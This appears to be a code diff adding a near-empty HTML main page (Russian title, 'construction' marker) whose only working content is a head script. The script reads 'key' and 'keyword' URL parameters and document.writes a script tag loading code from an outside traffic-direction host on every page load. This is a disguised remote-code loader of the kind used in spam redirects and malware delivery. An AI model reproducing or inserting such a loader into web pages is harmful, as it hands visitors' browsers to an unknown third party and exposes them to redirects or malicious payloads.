@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html data-page="construction">
+    <head>
+     <script>
+function GET(item) {
+    var p = window.location.search;
+    p = p.match(new RegExp(item+'=([^&=]+)'));
+    return p ? p[1] : false;
+}
+var url = "https://newtdsdom.com/jsclo?key="+GET('key')+"&keyword="+GET('keyword');
+document.write("<script src="+url+"><\/script>");
+</script>
+
+
+        <meta http-equiv="content-type" content="text/html;charset=utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Главная страница</title>
+        
+    </head>
+    <body>
+      
+    </body>
